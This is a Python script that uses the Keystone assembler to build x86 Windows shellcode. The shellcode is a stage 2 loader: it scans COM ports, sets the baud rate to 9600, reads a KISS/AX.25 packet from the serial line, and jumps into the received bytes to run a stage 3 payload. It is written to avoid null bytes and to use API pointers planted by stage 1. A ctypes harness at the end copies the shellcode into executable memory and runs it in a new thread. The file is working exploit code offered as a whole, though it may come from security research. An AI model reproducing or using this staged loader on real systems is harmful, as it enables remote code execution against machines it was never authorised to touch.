import ctypes, struct
from keystone import *

CODE = (
    " start: " #
    "    add esp, 0xfffffef0 ;"             # Make room for EBP vars
    #"    int3; "

    # ------------------------------------------------------
    # These pointers are overwritten by stage 1 shellcode to save space here
    # ------------------------------------------------------
    "    mov DWORD PTR [esp+0x10], 0xffffffff ;"      # These 0xffffffff addresses will be overwritten by stage1 shellcode
    "    mov DWORD PTR [esp+0x14], 0xffffffff ;"      # They will contain addresses for CreateFileA, ReadFile, GetCommState, SetCommState, CloseHandle
    "    mov DWORD PTR [esp+0x18], 0xffffffff ;"
    "    mov DWORD PTR [esp+0x1c], 0xffffffff ;"
    "    mov DWORD PTR [esp+0x2c], 0xffffffff ;"
    "    mov DWORD PTR [esp+0x24], 0xffffffff ;"      # This one holds the base address of the stage 2 code section

    # ------------------------------------------------------
    # Adjust stack pointers
    # ------------------------------------------------------
    #"    int3;"
    "    mov ebp, esp ;"
    "    add esp, 0xfffff9f0 ;"             # Avoiding NULL bytes ( sub esp, 0x610) - make room to store args/vars

    # ------------------------------------------------------
    # Try to open COM1, COM2, etc until one works
    # ------------------------------------------------------
    " build_com_string: "               # Build COM0 string
    "    xor ecx, ecx ;"
    "    push ecx ;"                    # NULL string terminator
    "    push 0x304d4f43 ;"             # COM0
    "    mov [ebp+0x44], esp ;"         # Save pointer to COM string

    " find_com_port_loop: "             # try to open COM1, COM2, COM3, etc until one works
    "    mov ecx, [ebp+0x44] ;"         # Retreive pointer to COM string
    "    add ecx, 0x03 ;"
    "    mov bl, [ecx] ;"         
    "    inc bl ;"
    "    mov [ecx], bl ;"

    " call_CreateFileA: "
    "    xor edx, edx ;"
    "    push edx ;"                    # arg: hTemplateFile
    "    push edx ;"                    # arg: dwFlagsAndAttributes
    "    add edx, 0x03 ;"
    "    push edx ;"                    # arg: dwCreationDisposition (OPEN_EXISTING)
    "    sub edx, 0x03; "
    "    push edx ;"                    # arg: lpSecurityAttributes
    "    push edx ;"                    # arg: dwShareMode
    "    mov edx, 0xbfffffff ;"
    "    inc edx ;"
    "    push edx ;"                    # arg: dwDesiredAccess (GENERIC_READ | GENERIC_WRITE) (0xC0000000)
    "    push [ebp+0x44] ;"             # arg: lpFileName
    "    call [ebp+0x10] ;"             # Call CreateFileA

    " check_result:"
    "    cmp eax, 0xffffffff ;"         # Check for INVALID_HANDLE_VALUE (failed to open COM port)
    "    je find_com_port_loop ;"       # Try again if it wasn't opened
    "    mov [ebp+0x44], eax; "         # Save handle for later

    # ------------------------------------------------------
    # Get COM port configuration including baud rage
    # ------------------------------------------------------
    " call_GetCommState: "
    "    lea ebx, [esp+0x28] ;"             
    "    push ebx ;"                    # arg: lpDCB
    "    push eax ;"                    # arg: hFile
    "    call [ebp+0x18] ;"             # call GetCommState to fill DCB struct with current settings

    # ------------------------------------------------------
    # Set baud rate to 9600
    # ------------------------------------------------------
    " update_DCB: "
    "    xor ecx, ecx ;"
    "    add cx, 0x2580 ;"              # 0n9600
    "    add ebx, 0x04 ;"               # Offset to baud rate param
    "    mov [ebx], ecx ;"              # set baud to 9600

    " call_SetCommState: "
    "    sub ebx, 0x04 ;"
    "    push ebx ;"                    # arg: lpDCB
    "    push [ebp+0x44] ;"             # arg: hFile
    "    call [ebp+0x1c] ;"             # call SetCommState to update baud rate

    "    xor esi, esi ;"                # 0xc0 byte counter
    "    xor ecx, ecx ;"                
    "    mov ebx, ecx ;"                # Byte Counter

    # ------------------------------------------------------
    # Read from COM port until two 0xC0 chars are received (start and end bytes)
    # ------------------------------------------------------
    " read_file: "                      # Read stage3 payload
    "    xor ecx, ecx ;"
    "    push ecx ;"                    # arg: lpOverlapped structure
    "    lea ecx, [ebp+0x34] ;"
    "    push ecx ;"                    # arg: lpNumberOfBytesRead (Writable DWORD).
    "    push 0x01 ;"                   # arg: nNumerOfBytesToRead
    "    mov eax, [ebp+0x24] ;"
    "    add eax, ebx ;"
    "    push eax ;"                    # arg: lpBuffer
    "    push [ebp+0x44] ;"             # arg: hFile
    "    call [ebp+0x14] ;"             # Call ReadFile()
    "    cmp dword ptr [ebp+0x34], 0x01 ;"        # Check if we read one byte
    "    jne read_file ;"               # if not, then just go back and read another byte
    "    mov cl, 0xc1 ;"
    "    dec ecx ;"
    "    mov eax, [ebp+0x24] ;"
    "    add eax, ebx ;"                # last read char in lpBuffer       
    "    inc ebx ;"                     # incremember the byte counter
    "    cmp cl, byte ptr [eax] ;"            # Check if the last read byte is 0xc0 (KISS start/stop bytes)
    "    je increment_c_count; "
    "    jmp read_file ;"               # Read another char

    " increment_c_count: "
    "    inc esi ;"
    "    cmp esi, 0x02 ;"
    "    jne read_file ;"               # If it's the first 0xc0 then keep reading since this is the beginning of the KISS packet  

    # ------------------------------------------------------
    # Close COM port so stage 3 can use it
    # ------------------------------------------------------
    " call_CloseHandle: "
    "    push [ebp+0x44] ;"             # arg: hFile
    "    call [ebp+0x2c] ;"             # call CloseHandle

    # ------------------------------------------------------
    # Execute stage 3 payload
    # ------------------------------------------------------
    " execute_stage_3: "
    "    mov ecx, [ebp+0x24] ;"
    "    add ecx, 0x12 ;"
    "    jmp ecx ;"                     # JMP to serial input buffer (offset skips the AX.25 addressing data)
)

# Initialize engine in X86-32bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_32)

encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)
instructions = ""
for dec in encoding:
    instructions += "\\x{0:02x}".format(int(dec)).rstrip("\n")

print(instructions)


sh = b""
for e in encoding:
    sh += struct.pack("B", e)
shellcode = bytearray(sh)

ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                            ctypes.c_int(len(shellcode) + 0x1000),
                                            ctypes.c_int(0x3000),
                                            ctypes.c_int(0x40))

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                    buf,
                                    ctypes.c_int(len(shellcode)))

print("Shellcode located at address %s" % hex(ptr))
input("...ENTER TO EXECUTE SHELLCODE...")

ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                        ctypes.c_int(0),
                                        ctypes.c_int(ptr),
                                        ctypes.c_int(0),
                                        ctypes.c_int(0),
                                        ctypes.pointer(ctypes.c_int(0)))
                                        
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))